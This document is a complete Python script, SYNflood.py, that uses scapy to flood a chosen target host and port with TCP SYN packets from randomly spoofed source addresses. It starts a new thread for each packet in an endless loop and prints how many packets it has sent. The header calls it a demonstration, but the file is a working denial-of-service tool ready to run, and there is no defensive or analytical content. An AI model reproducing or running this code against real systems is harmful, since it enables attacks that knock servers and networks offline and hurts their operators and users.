#! /usr/bin/python
#########################################
#
# SYNflood.py - A multithreaded SYN Flooder
# By Brandon Smith
# brandon.smith@studiobebop.net
#
# This script is a demonstration of a SYN/ACK 3 Way Handshake Attack
# as discussed by Halla of Information Leak
#
#########################################
#
# Modified by Uri
# 1336006643@qq.com
#
#########################################
import socket,random,sys,threading
from scapy.all import *

###
#Const
###
target=None
port=None
thread_limit=200
total=0
conf.iface='en1';#network card XD
###

class sendSYN(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		try:
			# There are two different ways you can go about pulling this off.
			# You can either:
			#   - 1. Just open a socket to your target on any old port
			#   - 2. Or you can be a cool kid and use scapy to make it look cool, and overcomplicated!
			#
			# (Uncomment whichever method you'd like to use)

			# Method 1
			#s=socket.socket()
			#s.connect((target,port))

			# Method 2
			i=IP()
			i.src="%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			i.dst=target
			t=TCP()
			t.sport=random.randint(1,65535)
			t.dport=port
			t.flags='S'
			send(i/t,verbose=0)
		except Exception, e:
			pass

def usage():
	print 'Usage: %s <Target> <Port>' % sys.argv[0]
	exit()

if __name__=='__main__':
	if len(sys.argv)!=3:
		usage()

	target=sys.argv[1]
	port=int(sys.argv[2])
	print 'Flooding %s:%i with SYN packets.' % (target,port)
	while 1:
		#if threading.activeCount()<thread_limit:
		sendSYN().start()
		total+=1
		sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)